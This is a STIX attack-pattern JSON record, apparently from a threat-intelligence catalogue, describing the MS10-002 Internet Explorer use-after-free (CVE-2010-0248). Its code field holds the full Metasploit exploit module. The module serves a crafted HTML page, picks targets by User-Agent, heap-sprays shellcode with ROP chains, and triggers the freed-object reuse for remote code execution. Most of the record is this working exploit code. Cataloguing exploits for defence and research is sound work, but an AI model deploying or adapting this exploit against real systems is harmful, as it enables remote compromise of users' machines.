{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7709f8a6-3730-4062-ae2e-eb91c3393313",
    "created": "2024-08-14T16:41:01.396478Z",
    "modified": "2024-08-14T16:41:01.396482Z",
    "name": "\"MS10-002 Microsoft Internet Explorer Object Memory Use-After-Free\"",
    "description": " This module exploits a vulnerability found in Internet Explorer's mshtml component.  Due to the way IE handles objects in memory, it is possible to cause a pointer in CTableRowCellsCollectionCacheItem::GetNext to be used even after it gets freed, therefore allowing remote code execution under the context of the user.  This particular vulnerability was also one of 2012's Pwn2Own challenges, and was later explained by Peter Vreugdenhil with exploitation details.  Instead of Peter's method, this module uses heap spraying like the 99% to store a specially crafted memory layout before re-using the freed memory.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/ms10_002_ie_object.rb",
            "external_id": "ms10_002_ie_object.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-0248"
        },
        {
            "source_name": "reference",
            "url": "http://dvlabs.tippingpoint.com/blog/2012/03/15/pwn2own-2012-challenge-writeup"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::RopDb\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"MS10-002 Microsoft Internet Explorer Object Memory Use-After-Free\",\n      'Description'    => %q{\n          This module exploits a vulnerability found in Internet Explorer's\n        mshtml component.  Due to the way IE handles objects in memory, it is\n        possible to cause a pointer in CTableRowCellsCollectionCacheItem::GetNext\n        to be used even after it gets freed, therefore allowing remote code\n        execution under the context of the user.\n\n          This particular vulnerability was also one of 2012's Pwn2Own\n        challenges, and was later explained by Peter Vreugdenhil with exploitation\n        details.  Instead of Peter's method, this module uses heap spraying like\n        the 99% to store a specially crafted memory layout before re-using the\n        freed memory.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Peter Vreugdenhil', # Vulnerability discovery and exploit writeup\n          'juan vazquez',      # Metasploit\n          'sinn3r'             # Metasploit\n        ],\n      'References'     =>\n        [\n          [ 'MSB', 'MS10-002'],\n          [ 'CVE', '2010-0248' ],\n          [ 'OSVDB', '61914'],\n          [ 'URL', 'http://dvlabs.tippingpoint.com/blog/2012/03/15/pwn2own-2012-challenge-writeup' ],\n          [ 'ZDI', '10-014']\n        ],\n      'Payload'        =>\n        {\n          'Space'    => 1000,\n          'BadChars' => \"\\x00\",\n          'DisableNops' => true\n        },\n      'DefaultOptions' =>\n        {\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate'\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Automatic', {} ],\n          [ 'IE 8 on Windows XP SP3', { 'Rop' => :msvcrt, 'Offset' => '0x5f4', 'Ret' => 0x77c15ed5 }, ],\n          [ 'IE 8 on Windows 7 SP0',  { 'Rop' => :jre,    'Offset' => '0x5f4', 'Ret' => 0x7c348b05 }  ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2010-01-21',\n      'DefaultTarget'  => 0))\n  end\n\n  def get_target(agent)\n    #If the user is already specified by the user, we'll just use that\n    return target if target.name != 'Automatic'\n\n    if agent =~ /NT 5\\.1/ and agent =~ /MSIE 8/\n      return targets[1]  #IE 8 on Windows XP SP3\n    elsif agent =~ /NT 6\\.1/ and agent =~ /MSIE 8/\n      return targets[2]  #IE 8 on Windows 7 SP1 with JRE\n    else\n      return nil\n    end\n  end\n\n  def on_request_uri(cli, request)\n    agent = request.headers['User-Agent']\n    my_target = get_target(agent)\n\n    # Avoid the attack if the victim doesn't have the same setup we're targeting\n    if my_target.nil?\n      print_error(\"Browser not supported: #{agent.to_s}\")\n      send_not_found(cli)\n      return\n    end\n\n    print_status(\"Target selected: #{my_target.name}\")\n\n    js_code = build_javascript(my_target)\n\n    html = %Q|\n<html>\n  <head>\n  <script>\n#{js_code}\n    </script>\n  </head>\n  <body onLoad=\"window.setTimeout(Start,100);\" id=\"bodyid\">\n\n  <table id=\"tableid\">\n    <tr><th id=\"thid\"></th></tr>\n    <tr id=\"trid\"><td id=\"tdid\"></td></tr>\n  </table>\n\n  </body>\n</html>\n    |\n\n    print_status(\"Sending HTML\")\n    send_response(cli, html, {'Content-Type'=>'text/html'})\n\n  end\n\n  def build_javascript(my_target)\n\n    p = get_payload(my_target)\n    js_code = Rex::Text.to_unescape(p, Rex::Arch.endian(my_target.arch))\n    js_nops = Rex::Text.to_unescape(\"\\x0c\"*4, Rex::Arch.endian(my_target.arch))\n    randnop = rand_text_alpha(rand(100) + 1)\n\n    # The exploit will try to take up the freed memory\n    # with a fake item before the reuse\n    fake_item = [\n      junk,\n      junk,\n      junk,\n      junk,\n      junk,\n      junk,\n      junk,\n      junk,\n      junk,\n      junk,\n      junk,\n      junk,\n      junk,\n      junk,\n      junk,\n      junk,\n      junk,\n      0x0c0c003c, # pointer to c_table_cell\n      junk,\n      junk,\n      junk,\n      0x0c0c0050, # pointer to c_cache_item\n      junk,\n      junk,\n    ].pack(\"V*\")\n    fake_item_js = Rex::Text.to_unescape(fake_item)\n\n    # Here start the crafted layout of the memory\n    # which will be sprayed to get code execution\n    # IE 8 => Spray be sprayed into 0c0c0024\n    memory_layout = [\n      junk,\n      junk,\n      junk,\n      junk,\n      junk,\n      junk,\n      0x0c0c0040, # ----- points to 0x0c0c0040\n      0x0c0c0c0c, # <---|  0x0c0c0c0c + 0x70: 0x0c0c0c7c will store the stackpivot with eax pointing to 0c0c0c0c\n      junk,\n      junk,\n      0x00000000, # Allows to bypass CTableCell::GetAAcolSpan\n      junk,       # Stored at 0c0c0c50\n      junk,\n      junk,\n      0x0c0c0078,\n      junk,\n      junk,\n      junk,\n      junk,\n      junk,\n      0x0c0c0c50, # <- Stored at 0c0c0074 (0x0c0c0078 - 4)\n      0x00000001  # Stored at 0c0c0078 (0c0c0050+28) # Allows to exit of CTableRowCellsCollectionCacheItem::GetNext faster\n    ].pack(\"V*\")\n    memory_layout_js = Rex::Text.to_unescape(memory_layout)\n\n    # Steps:\n    # 1. Force the free.\n    # 2. Try to reuse the freed memory with a fake item.\n    # The fake item store crafted pointers to the\n    # memory which will be sprayed on step 3.\n    # 3. Heap Spray: Shellcode + crafted memory layout to\n    # get execution flow when the memory freed in step 1\n    # is reused in step 4.\n    # 4. Force the memory reuse.\n    spray = <<-JS\nfunction Start() {\n\n  var fake_items = unescape(\"#{fake_item_js}\");\n  while (fake_items.length < 0x1000) fake_items+= fake_items;\n  var fake_item = fake_items.substring(0, (96-6)/2);\n\n  var code = unescape(\"#{js_code}\");\n  var memory_layout = unescape(\"#{memory_layout_js}\")\n  var #{randnop} = \"#{js_nops}\";\n  var nops = unescape(#{randnop});\n  while (nops.length < 0x80000) nops += nops;\n  var offset = nops.substring(0, #{my_target['Offset']} - memory_layout.length);\n  var shellcode = memory_layout + offset + code + nops.substring(0, 0x800-#{my_target['Offset']}-code.length);\n  while (shellcode.length < 0x40000) shellcode += shellcode;\n  var block_shell = shellcode.substring(0, (0x80000-6)/2);\n\n  var heap = new heapLib.ie(0x20000);\n\n  var TableClone = document.getElementById('tableid').cloneNode(1);\n  var TableCellUrns = TableClone.cells.urns('a');\n  var bla = TableClone.cells.item(1);\n  var TableCellUrnsTags = TableCellUrns.tags('a');\n  TableClone.outerText = 'a';\n\n  heap.gc();\n  for(i = 0; i < 30; i++) {\n    heap.alloc(fake_item);\n  }\n\n  for (var i=1; i < 0x1C2; i++) {\n    heap.alloc(block_shell);\n  }\n\n  Result = TableClone.cells;\n  Result = TableCellUrnsTags.item(1);\n\n}\n    JS\n\n    spray = heaplib(spray, {:noobfu => true})\n    return spray\n  end\n\n  def junk(n=4)\n    return rand_text_alpha(n).unpack(\"V\").first\n  end\n\n  # ROP chain + shellcode will be sprayed at 0x0c0c0c0c\n  def get_payload(t)\n    p  = make_nops(46)\n    p << Metasm::Shellcode.assemble(Metasm::Ia32.new, \"jmp $+0x6\").encode_string # instr length: 2 bytes\n    p << [t.ret].pack(\"V\") # Stack Pivot\n    p << payload.encoded\n\n    case t['Rop']\n    when :msvcrt\n      rop_payload = generate_rop_payload('msvcrt', p, {'target'=>'xp'})\n    else\n      rop_payload = generate_rop_payload('java', p)\n    end\n\n    return rop_payload\n  end\nend\n\n=begin\n(694.cc0): Break instruction exception - code 80000003 (first chance)\neax=00000000 ebx=00000100 ecx=0241f518 edx=7c90e4f4 esi=7c90d6d0 edi=ffffffff\neip=7c8022cf esp=0241f534 ebp=0241f548 iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246\nkernel32!WriteProcessMemory+0x6d:\n7c8022cf cc              int     3\n=end\n",
    "x_mitre_disclosure_date": "2010-01-21",
    "x_mitre_platforms": [
        "win'"
    ]
}